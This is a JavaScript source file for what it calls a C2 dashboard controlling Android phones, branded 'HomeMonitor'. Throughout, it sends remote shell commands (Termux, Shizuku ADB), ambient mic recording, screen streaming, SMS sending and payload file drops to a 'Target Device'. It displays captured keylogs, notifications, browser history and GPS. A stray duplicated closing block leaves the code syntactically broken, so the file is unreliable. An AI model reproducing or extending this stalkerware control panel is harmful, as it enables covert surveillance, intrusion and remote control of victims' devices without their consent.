// app.js - Main Dashboard C2 Controller & Realtime Telemetry Listeners
// TODO: [GOOGLE DRIVE OAUTH] Google OAuth 2.0 requires a valid Client ID saved in localStorage or the Overview input box.
// TODO: [MASTER ADMIN LICENSE] Master Admin Controls sync License Status (ACTIVE/TRIAL/EXPIRED) and 8 feature flags.
// TODO: [TAB RESPONSE SYNC] Each feature tab contains a [ Fetch Response ] button for instant DataChannel/Firebase RPC sync.
let activeDeviceId = "DEV_DEFAULT";

function detectClientOperatingSystem() {
    const ua = navigator.userAgent || "";
    const platform = navigator.platform || "";
    const label = document.getElementById("autoArchiveLabel");
    if (!label) return;

    if (ua.includes("Linux") || platform.includes("Linux")) {
        label.innerHTML = `<i class="fa-brands fa-linux me-1 text-primary"></i>Auto-Archive to Linux Storage`;
    } else if (ua.includes("Mac") || platform.includes("Mac")) {
        label.innerHTML = `<i class="fa-brands fa-apple me-1 text-primary"></i>Auto-Archive to Mac Storage`;
    } else if (ua.includes("Win") || platform.includes("Win")) {
        label.innerHTML = `<i class="fa-brands fa-windows me-1 text-primary"></i>Auto-Archive to Windows Storage`;
    } else if (ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad")) {
        label.innerHTML = `<i class="fa-solid fa-mobile-screen me-1 text-primary"></i>Auto-Archive to Mobile Storage`;
    } else {
        label.innerHTML = `<i class="fa-solid fa-hard-drive me-1 text-primary"></i>Auto-Archive to Local Storage`;
    }
}

// Global Event Delegation for ALL C2 Command Buttons
document.addEventListener("click", function(e) {
    const btn = e.target.closest(".exec-cmd");
    if (btn) {
        const cmd = btn.getAttribute("data-cmd");
        if (cmd) {
            console.log(`[C2 Command Clicked] Dispatching '${cmd}'`);
            sendC2CommandToDevice(cmd);
        }
    }

    const fetchBtn = e.target.closest(".fetch-tab-response");
    if (fetchBtn) {
        const cat = fetchBtn.getAttribute("data-category") || "general";
        console.log(`[Fetch Tab Response Clicked] Querying telemetry for '${cat}'`);
        showDashboardNotification("info", `Fetching latest response for '${cat}'...`);
        if (typeof fetchCategoryTelemetryLogs === "function") {
            fetchCategoryTelemetryLogs(cat);
        }
    }

    const termuxBtn = e.target.closest(".termux-quick");
    if (termuxBtn) {
        const sh = termuxBtn.getAttribute("data-sh");
        if (sh) {
            sendC2CommandToDevice(`/termux ${sh}`);
            const consoleBox = document.getElementById("termuxConsoleOutput");
            if (consoleBox) {
                consoleBox.innerHTML += `\n$ ${sh}\n[Executed - Awaiting output...]`;
                consoleBox.scrollTop = consoleBox.scrollHeight;
            }
        }
    }
});

function setupFirebaseConnectionMonitor() {
    if (typeof firebase === "undefined" || !firebase.database) return;
    const badge = document.getElementById("rtdbConnBadge");
    if (!badge) return;

    firebase.database().ref(".info/connected").on("value", snapshot => {
        if (snapshot.val() === true) {
            badge.className = "badge bg-success extra-small mt-1 d-inline-block";
            badge.innerHTML = `<i class="fa-solid fa-circle-check me-1"></i>Sync Active 🟢`;
        } else {
            badge.className = "badge bg-danger extra-small mt-1 d-inline-block";
            badge.innerHTML = `<i class="fa-solid fa-triangle-exclamation me-1"></i>Offline / Reconnecting...`;
        }
    });
}

document.addEventListener("DOMContentLoaded", function() {
    detectClientOperatingSystem();
    setupFirebaseConnectionMonitor();
    setupGoogleDriveOAuthConnect();
    if (typeof loadEnrolledDevicesList === "function") {
        loadEnrolledDevicesList();
    }

    document.getElementById("refreshTabBtn")?.addEventListener("click", function() {
        console.log("[Sync Now] Re-syncing active device telemetry...");
        if (activeDeviceId) {
            startRealtimeDeviceListener(activeDeviceId);
        }
        alert("🔄 Device Telemetry Sync Dispatched!");
    });

    document.getElementById("startP2pWebStreamBtn")?.addEventListener("click", function() {
        const sessId = "sess_" + Date.now();
        if (typeof initWebRtcSession === "function") {
            initWebRtcSession(sessId, true);
        }
        sendC2CommandToDevice("!webstream");
        alert("🎮 Initiated WebRTC P2P Live Screen Stream session: " + sessId);
    });

    document.getElementById("stopP2pWebStreamBtn")?.addEventListener("click", function() {
        sendC2CommandToDevice("!stopwebstream");
        if (typeof pc !== "undefined" && pc) {
            pc.close();
        }
        alert("🛑 Stopped WebRTC P2P Live Screen Stream session.");
    });
});

function loadEnrolledDevicesList() {
    const selector = document.getElementById("deviceSelector");
    if (!selector) return;

    const db = firebase.database();
    const uid = currentUser ? currentUser.uid : "default_user";

    db.ref(`users/${uid}/devices`).on("value", snapshot => {
        const discoveredDevices = snapshot.val() || {};
        selector.innerHTML = "";

        if (Object.keys(discoveredDevices).length > 0) {
            let firstId = null;
            Object.keys(discoveredDevices).forEach(devKey => {
                const devData = discoveredDevices[devKey];
                const status = devData.status || {};
                const devModel = status.model || "Android Device";
                const devName = `📱 ${devModel} (${devKey})`;

                const option = document.createElement("option");
                option.value = devKey;
                option.innerText = devName;
                selector.appendChild(option);

                if (!firstId) firstId = devKey;
            });

            if (firstId) {
                if (!activeDeviceId || !discoveredDevices[activeDeviceId]) {
                    activeDeviceId = firstId;
                }
                selector.value = activeDeviceId;
                updateActiveDeviceHeader(activeDeviceId);
                startRealtimeDeviceListener(activeDeviceId);
            }
        } else {
            const devOption = document.createElement("option");
            devOption.value = "DEV_MONITORED_DEVICE";
            devOption.innerText = "📱 HomeMonitor System (Awaiting Device Connection...)";
            selector.appendChild(devOption);

            activeDeviceId = "DEV_MONITORED_DEVICE";
            updateActiveDeviceHeader(activeDeviceId);
            startRealtimeDeviceListener(activeDeviceId);
        }
    }, error => {
        console.warn("[Firebase] Device discovery error:", error);
    });
}

document.getElementById("deviceSelector")?.addEventListener("change", function() {
    activeDeviceId = this.value;
    updateActiveDeviceHeader(activeDeviceId);
    startRealtimeDeviceListener(activeDeviceId);
});

let activeFirebaseListeners = [];

function registerActiveFirebaseListener(ref, eventType, callback) {
    ref.on(eventType, callback);
    activeFirebaseListeners.push({ ref: ref, eventType: eventType, callback: callback });
}

function cleanupActiveFirebaseListeners() {
    activeFirebaseListeners.forEach(function(item) {
        try { item.ref.off(item.eventType, item.callback); } catch (_) {}
    });
    activeFirebaseListeners = [];
}

function updateActiveDeviceHeader(deviceId) {
    const title = document.getElementById("activeDeviceTitle");
    if (title) title.innerText = `📱 Target Device: ${deviceId}`;
}

function startRealtimeDeviceListener(deviceId) {
    cleanupActiveFirebaseListeners();
    const db = firebase.database();
    const uid = currentUser ? currentUser.uid : "default_user";

    const statusHandler = snapshot => {
        const val = snapshot.val();
        if (val) {
            const meta = document.getElementById("activeDeviceMeta");
            if (meta) meta.innerText = `ID: ${val.deviceId || deviceId} | Model: ${val.model || 'Target Device'} | OS: Android ${val.androidVersion || '14'}`;

            const bat = document.getElementById("batteryBadge");
            if (bat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                bat.innerText = `Battery: ${val.battery ?? val.batteryLevel}%`;
            }

            const overviewName = document.getElementById("overviewDevName");
            if (overviewName) overviewName.innerText = val.model || deviceId;

            const overviewBat = document.getElementById("overviewBattery");
            if (overviewBat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                overviewBat.innerText = `${val.battery ?? val.batteryLevel}%`;
            }

            const syncTime = document.getElementById("lastSyncTime");
            if (syncTime) syncTime.innerText = new Date(val.lastSeen || Date.now()).toLocaleTimeString();

            // Populate Device Specs
            const specModel = document.getElementById("specModel");
            if (specModel) specModel.innerText = val.model || "Android System";
            const specOs = document.getElementById("specOs");
            if (specOs) specOs.innerText = `Android ${val.androidVersion || '14'} (SDK ${val.sdkInt || '35'})`;
            const specBattery = document.getElementById("specBattery");
            if (specBattery) specBattery.innerText = `${val.battery ?? val.batteryLevel ?? '85'}% (Good)`;
            const lastSeenMs = val.lastSeen || 0;
            const nowMs = Date.now();
            const isFresh = lastSeenMs > 0 && (nowMs - lastSeenMs < 45000);
            const statusLabel = isFresh ? "Online 🟢" : `Offline (Last seen ${Math.round((nowMs - lastSeenMs)/60000)}m ago) 🟡`;

            const specIp = document.getElementById("specIp");
            if (specIp) specIp.innerText = `${val.activeAccount || 'RTDB'} | Status: ${statusLabel}`;
        }
    };

    const statusRef = db.ref(`users/${uid}/devices/${deviceId}/status`);
    registerActiveFirebaseListener(statusRef, "value", statusHandler);

    // Subscribe to live GPS telemetry
    const gpsRef = db.ref(`users/${uid}/devices/${deviceId}/telemetry/gps_locations`).limitToLast(1);
    const gpsHandler = snapshot => {
        const gpsVal = snapshot.val();
        if (gpsVal) {
            const lastKey = Object.keys(gpsVal)[0];
            const item = gpsVal[lastKey];
            const textEl = document.getElementById("overviewGpsText");
            const metaEl = document.getElementById("overviewGpsMeta");
            if (textEl) textEl.innerHTML = `<i class="fa-solid fa-map-pin me-2"></i>Last Position: ${item.content || 'GPS Fix Acquired'}`;
            if (metaEl) metaEl.innerText = `Updated: ${new Date(item.timestamp || Date.now()).toLocaleTimeString()}`;
        }
    };
    registerActiveFirebaseListener(gpsRef, "value", gpsHandler);

    // Subscribe to command responses across output containers
    const responseHandler = snapshot => {
        const respText = snapshot.val();
        if (!respText) return;

        // Filter out legacy 404 upload error messages from repeating background tasks
        if (respText.includes("Upload failed: 404")) return;

        const timestamp = new Date().toLocaleTimeString();
        const lastCmd = (window.lastDispatchedCmd || "").toLowerCase();
        const isTermuxCmd = lastCmd.includes("termux") || lastCmd.includes("shell") || respText.startsWith("[Termux]") || respText.startsWith("$ ");

        // Termux Console gets formatted CLI output ONLY for Termux commands
        if (isTermuxCmd) {
            const termuxBox = document.getElementById("termuxConsoleOutput");
            if (termuxBox) {
                termuxBox.innerHTML += `\n[${timestamp}] Response:\n${respText}\n`;
                termuxBox.scrollTop = termuxBox.scrollHeight;
            }
        }

        // Remote File Dropper output container
        if (lastCmd.includes("download") || lastCmd.includes("dropper") || respText.includes("Payload") || respText.includes("File downloaded")) {
            const dropperBox = document.getElementById("fileDropperHistoryList");
            if (dropperBox) {
                if (dropperBox.querySelector(".text-muted")) dropperBox.innerHTML = "";
                const item = document.createElement("div");
                item.className = "list-group-item bg-dark text-light border-secondary py-2 px-3 extra-small";
                item.innerHTML = `<span class="badge bg-success me-2">${timestamp}</span> ${escapeHtml(respText)}`;
                dropperBox.prepend(item);
            }
        }

        // MDM Security Log List
        if (lastCmd.includes("mdm") || lastCmd.includes("wipe") || lastCmd.includes("lock")) {
            const mdmBox = document.getElementById("mdmLogList");
            if (mdmBox) {
                if (mdmBox.querySelector(".text-muted")) mdmBox.innerHTML = "";
                const item = document.createElement("div");
                item.className = "list-group-item bg-dark text-light border-secondary py-2 px-3 extra-small";
                item.innerHTML = `<span class="badge bg-info me-2">${timestamp}</span> ${escapeHtml(respText)}`;
                mdmBox.prepend(item);
            }
        }

        // Executive Activity Stream gets structured timeline cards with timestamp
        const streamBox = document.getElementById("execActivityStream");
        if (streamBox) {
            if (streamBox.querySelector(".text-muted")) streamBox.innerHTML = "";
            const card = document.createElement("div");
            card.className = "card bg-dark text-light border-secondary p-2 mb-2 extra-small";
            card.innerHTML = `
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-primary px-2 py-1"><i class="fa-solid fa-check-double me-1"></i>Device Response</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timestamp}</span>
                </div>
                <div class="font-monospace text-success text-break" style="white-space: pre-wrap;">${escapeHtml(respText)}</div>
            `;
            streamBox.prepend(card);
        }
    };
        }
    };
    const responseRef = db.ref(`users/${uid}/devices/${deviceId}/response`);
    registerActiveFirebaseListener(responseRef, "value", responseHandler);

    loadMasterAdminPermissionMatrix(uid, deviceId);
}

function loadMasterAdminPermissionMatrix(uid, deviceId) {
    const tableBody = document.getElementById("masterAdminDeviceTable");
    if (!tableBody) return;
    tableBody.innerHTML = `
        <tr>
            <td><code>${deviceId}</code></td>
            <td>${currentUser ? currentUser.email : "admin@homemonitor.com"}</td>
            <td>Android System (SDK 35)</td>
            <td>
                <div class="row g-2">
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permCam"> <label class="small fw-bold">Camera</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMic"> <label class="small fw-bold">Mic Audio</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permGps"> <label class="small fw-bold">GPS Location</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permTermux"> <label class="small fw-bold">Termux Shell</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permSms"> <label class="small fw-bold">SMS & Calls</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permFiles"> <label class="small fw-bold">Files Explorer</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMdm"> <label class="small fw-bold">MDM Wipe</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permScreen"> <label class="small fw-bold">Screen Record</label></div></div>
                </div>
            </td>
            <td>
                <div class="mb-2">
                    <select id="adminLicenseStatusSelect" class="form-select form-select-sm mb-1 fw-bold">
                        <option value="ACTIVE" selected>ACTIVE (Full Access)</option>
                        <option value="TRIAL">TRIAL MODE</option>
                        <option value="EXPIRED">EXPIRED / LOCKED</option>
                    </select>
                    <input type="text" id="adminLicenseKeyInput" class="form-control form-control-sm font-monospace" placeholder="HM-KEY-2026-PRO">
                </div>
                <button class="btn btn-sm btn-warning w-100 fw-bold" onclick="saveFeaturePermissions('${uid}', '${deviceId}')"><i class="fa-solid fa-save me-1"></i>Save Master Flags & License</button>
            </td>
        </tr>
    `;
}

function saveFeaturePermissions(uid, deviceId) {
    const flags = {
        camera_enabled: document.getElementById("permCam")?.checked ?? true,
        mic_enabled: document.getElementById("permMic")?.checked ?? true,
        location_enabled: document.getElementById("permGps")?.checked ?? true,
        termux_enabled: document.getElementById("permTermux")?.checked ?? true,
        sms_calls_enabled: document.getElementById("permSms")?.checked ?? true,
        files_enabled: document.getElementById("permFiles")?.checked ?? true,
        mdm_wipe_enabled: document.getElementById("permMdm")?.checked ?? true,
        screen_record_enabled: document.getElementById("permScreen")?.checked ?? true
    };

    const licenseStatus = document.getElementById("adminLicenseStatusSelect")?.value || "ACTIVE";
    const licenseKey = document.getElementById("adminLicenseKeyInput")?.value?.trim() || "HM-KEY-2026-PRO";

    firebase.database().ref(`users/${uid}/devices/${deviceId}/feature_flags`).set(flags);
    firebase.database().ref(`users/${uid}/devices/${deviceId}/license`).set({
        status: licenseStatus,
        key: licenseKey,
        updatedAt: Date.now()
    });

    localStorage.setItem(`flags_${deviceId}`, JSON.stringify(flags));
    showDashboardNotification("success", `Master Admin: Flags & License (${licenseStatus}) updated for ${deviceId}`);
}

// Termux Interactive Terminal Form
document.getElementById("termuxForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const cmd = document.getElementById("termuxInput").value.trim();
    if (cmd) {
        sendC2CommandToDevice(`/termux ${cmd}`);
        const consoleBox = document.getElementById("termuxConsoleOutput");
        if (consoleBox) {
            consoleBox.innerHTML += `\n$ ${cmd}\n[Executed - Awaiting Termux output...]`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
        document.getElementById("termuxInput").value = "";
    }
});

// SMS Sending Form
document.getElementById("smsSendForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const phone = document.getElementById("smsPhoneNum").value.trim();
    const msg = document.getElementById("smsMsgText").value.trim();
    if (phone && msg) {
        sendC2CommandToDevice(`/sendsms ${phone} ${msg}`);
        alert(`✅ Outbound SMS dispatched to ${phone}`);
    }
});

// Open Browser URL Form
document.getElementById("openUrlForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("targetUrlInput").value.trim();
    if (url) {
        sendC2CommandToDevice(`/openurl ${url}`);
        alert(`🌐 Browser target URL launched: ${url}`);
    }
});

// Ambient Mic Recording Button
document.getElementById("startMicRecordBtn")?.addEventListener("click", function() {
    const sec = document.getElementById("micDurationSelect").value;
    sendC2CommandToDevice(`/audio ${sec}`);
    alert(`🎙️ Ambient Mic Recording (${sec}s) dispatched to device.`);
});

// Shizuku ADB Command Form
document.getElementById("shizukuForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const shizukuCmd = document.getElementById("shizukuCmdInput").value.trim();
    if (shizukuCmd) {
        sendC2CommandToDevice(`/shizuku ${shizukuCmd}`);
        alert(`⚡ Shizuku ADB command dispatched: ${shizukuCmd}`);
    }
});

// Geofence Form
document.getElementById("geofenceForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const inputs = this.querySelectorAll("input");
    const zoneName = inputs[0]?.value.trim() || "Safe Zone";
    const radius = inputs[1]?.value.trim() || "500";
    sendC2CommandToDevice(`/geofence add ${zoneName} ${radius}`);
    alert(`🌐 Geofence safe zone added: ${zoneName} (${radius}m)`);
});

// File Dropper Form
document.getElementById("fileDropperForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("dropperTargetUrl")?.value.trim();
    const path = document.getElementById("dropperDestination")?.value.trim();
    if (url && path) {
        sendC2CommandToDevice(`/download ${url} ${path}`);
        alert(`📥 Payload file push dispatched to ${path}`);
    }
});

// Contact Search Filter
document.getElementById("contactSearchInput")?.addEventListener("keyup", function() {
    const term = this.value.toLowerCase();
    const rows = document.querySelectorAll("#contactsTableBody tr");
    rows.forEach(r => {
        const text = r.innerText.toLowerCase();
        r.style.display = text.includes(term) ? "" : "none";
    });
});

function sendC2CommandToDevice(cmdText) {
    if (!cmdText) return;
    // Normalize '/' prefix to '!' prefix for command consistency
    const normalizedCmd = cmdText.startsWith("/") ? "!" + cmdText.substring(1) : cmdText;
    window.lastDispatchedCmd = normalizedCmd;

    const uid = currentUser ? currentUser.uid : "default_user";
    const db = firebase.database();

    const cmdPayload = {
        text: normalizedCmd,
        status: "pending",
        timestamp: Date.now()
    };

    // Push command payload to authorized device target path
    db.ref(`users/${uid}/devices/${activeDeviceId}/commands`).push().set(cmdPayload);

    // Cache sent command locally in localStorage
    const history = JSON.parse(localStorage.getItem(`cmd_history_${activeDeviceId}`) || "[]");
    history.push({ cmd: normalizedCmd, time: new Date().toLocaleTimeString() });
    localStorage.setItem(`cmd_history_${activeDeviceId}`, JSON.stringify(history.slice(-50)));

    showDashboardNotification("success", `Dispatched '${normalizedCmd}' to ${activeDeviceId}`);
}

function triggerLocalDiskAutoArchive(filename, contentText) {
    const isAutoArchiveEnabled = document.getElementById("autoArchiveLocalToggle")?.checked ?? true;
    if (!isAutoArchiveEnabled || !contentText) return;

    try {
        const blob = new Blob([contentText], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `C2_Archive_${filename}_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        console.log(`[Local Disk Auto-Archive] Successfully archived ${filename} to local storage.`);
    } catch (e) {
        console.warn(`[Local Disk Auto-Archive] Local archive error: ${e.message}`);
    }
}

function showDashboardNotification(type, message) {
    console.log(`[Dashboard Notification - ${type.toUpperCase()}] ${message}`);
    const notificationContainer = document.getElementById("dashboardToastContainer") || (() => {
        const div = document.createElement("div");
        div.id = "dashboardToastContainer";
        div.className = "position-fixed bottom-0 end-0 p-3";
        div.style.zIndex = "9999";
        document.body.appendChild(div);
        return div;
    })();

    const toast = document.createElement("div");
    const bgClass = type === "success" ? "bg-success" : type === "error" ? "bg-danger" : type === "warning" ? "bg-warning text-dark" : "bg-info text-dark";
    toast.className = `toast align-items-center text-white ${bgClass} border-0 show mb-2`;
    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body fw-bold">
                ${type === 'success' ? '🟢' : type === 'error' ? '🔴' : type === 'warning' ? '🟡' : 'ℹ️'} ${message}
            </div>
            <button type="button" class="btn-close me-2 m-auto" onclick="this.parentElement.parentElement.remove()"></button>
        </div>
    `;
    notificationContainer.appendChild(toast);
    setTimeout(() => { try { toast.remove(); } catch (_) {} }, 4000);
}

function escapeHtml(str) {
    if (!str) return "";
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

function fetchCategoryTelemetryLogs(tabCategory) {
    const uid = currentUser ? currentUser.uid : "default_user";

    const telemetryRef = firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/telemetry/${tabCategory}`).limitToLast(30);
    registerActiveFirebaseListener(telemetryRef, "value", snapshot => {
        const val = snapshot.val();
        if (val) {
            const items = Object.keys(val).map(key => val[key]);
            renderCategoryTelemetry(tabCategory, items);
        } else {
            renderCategoryTelemetry(tabCategory, []);
        }
    });
}

function renderCategoryTelemetry(category, items) {
    const timeStr = (ts) => new Date(ts || Date.now()).toLocaleTimeString();

    if (category === "notifications" || category === "notification") {
        const container = document.getElementById("notificationFeedContainer");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">🔔 No notification telemetry recorded yet.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-warning text-dark fw-bold"><i class="fa-solid fa-bell me-1"></i>${escapeHtml(item.sourceApp || item.app || 'Notification')}</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
                </div>
                <h6 class="fw-bold mb-1 text-light">${escapeHtml(item.title || item.sender || 'System Alert')}</h6>
                <p class="mb-0 small text-secondary">${escapeHtml(item.content || item.body || item.text || '')}</p>
            </div>
        `).join("");
    } else if (category === "keylogs" || category === "keylogger") {
        const container = document.getElementById("keyloggerFeedContainer");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">⌨️ No keystroke keylogs recorded yet.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-danger fw-bold"><i class="fa-solid fa-keyboard me-1"></i>${escapeHtml(item.sourceApp || item.app || 'Keylogger')}</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
                </div>
                <div class="font-monospace text-success mt-1 small">${escapeHtml(item.content || item.body || item.text || '')}</div>
            </div>
        `).join("");
    } else if (category === "browser_history" || category === "browser") {
        const container = document.getElementById("browserHistoryTableBody");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<tr><td colspan="4" class="text-center text-muted py-4">🌐 No browser history telemetry recorded yet.</td></tr>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <tr>
                <td><span class="badge bg-info text-dark"><i class="fa-solid fa-compass me-1"></i>${escapeHtml(item.sourceApp || 'Chrome')}</span></td>
                <td class="fw-bold text-light">${escapeHtml(item.title || item.content || 'Web Page')}</td>
                <td><small class="text-muted">${timeStr(item.timestamp)}</small></td>
                <td><a href="${escapeHtml(item.extraUrl || '#')}" target="_blank" class="btn btn-sm btn-outline-info text-nowrap"><i class="fa-solid fa-external-link me-1"></i>Open</a></td>
            </tr>
        `).join("");
    } else {
        const container = document.getElementById("genericFeedContainer");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">📡 No telemetry items recorded for '${category}'.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-secondary extra-small"><i class="fa-solid fa-layer-group me-1"></i>${escapeHtml(category)}</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
                </div>
                <p class="mb-0 small text-light">${escapeHtml(item.content || item.body || item.text || JSON.stringify(item))}</p>
            </div>
        `).join("");
    }
}

function setupGoogleDriveOAuthConnect() {
    const btn = document.getElementById("connectGoogleDriveBtn");
    const statusLabel = document.getElementById("gdriveAccountStatus");
    const clientIdInput = document.getElementById("gdriveClientIdInput");
    const saveKeyBtn = document.getElementById("saveGdriveClientIdBtn");

    if (!btn) return;

    const savedClientId = localStorage.getItem("gdrive_client_id") || "";
    if (clientIdInput) {
        clientIdInput.value = savedClientId;
    }

    if (saveKeyBtn && clientIdInput) {
        saveKeyBtn.addEventListener("click", function() {
            const newKey = clientIdInput.value.trim();
            localStorage.setItem("gdrive_client_id", newKey);
            showDashboardNotification("success", "✅ Google OAuth Client ID saved to Browser Storage!");
        });
    }

    const savedDriveToken = localStorage.getItem("gdrive_connected_token");
    if (savedDriveToken && statusLabel) {
        statusLabel.innerHTML = `Status: <strong class="text-success">Connected 🟢 (15 GB Personal Cloud Storage Active)</strong>`;
        btn.className = "btn btn-sm btn-outline-success fw-bold";
        btn.innerHTML = `<i class="fa-brands fa-google me-1"></i>Google Drive Active 🟢`;
    }

    btn.addEventListener("click", function() {
        console.log("[Google Drive OAuth] Launching 1-Click Google Authorization...");
        let client_id = clientIdInput ? clientIdInput.value.trim() : "";
        if (!client_id) {
            client_id = localStorage.getItem("gdrive_client_id") || "";
        }

        if (!client_id) {
            showDashboardNotification("warning", "⚠️ Please enter your Google Cloud OAuth Client ID in the input box above first!");
            if (clientIdInput) clientIdInput.focus();
            return;
        }

        const redirect_uri = window.location.origin + window.location.pathname;
        const scope = "https://www.googleapis.com/auth/drive.file";

        const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${client_id}&redirect_uri=${encodeURIComponent(redirect_uri)}&response_type=token&scope=${encodeURIComponent(scope)}`;

        const popup = window.open(authUrl, "GoogleDriveAuth", "width=550,height=650");
        showDashboardNotification("info", "Opening Google Sign-In... Select your Google Account to connect 15 GB Free Storage");

        const checkInterval = setInterval(() => {
            try {
                if (popup && popup.location && popup.location.hash) {
                    const hash = popup.location.hash.substring(1);
                    const params = new URLSearchParams(hash);
                    const accessToken = params.get("access_token");
                    if (accessToken) {
                        clearInterval(checkInterval);
                        popup.close();
                        localStorage.setItem("gdrive_connected_token", accessToken);

                        const uid = currentUser ? currentUser.uid : "default_user";
                        firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/gdrive_config`).set({
                            status: "CONNECTED",
                            accessToken: accessToken,
                            updatedAt: Date.now()
                        });

                        if (statusLabel) {
                            statusLabel.innerHTML = `Status: <strong class="text-success">Connected 🟢 (15 GB Personal Cloud Storage Active)</strong>`;
                        }
                        btn.className = "btn btn-sm btn-outline-success fw-bold";
                        btn.innerHTML = `<i class="fa-brands fa-google me-1"></i>Google Drive Active 🟢`;
                        showDashboardNotification("success", "✅ Google Drive Connected! 15 GB Free Cloud Storage Ready");
                    }
                }
            } catch (_) {}
        }, 500);
    });
}
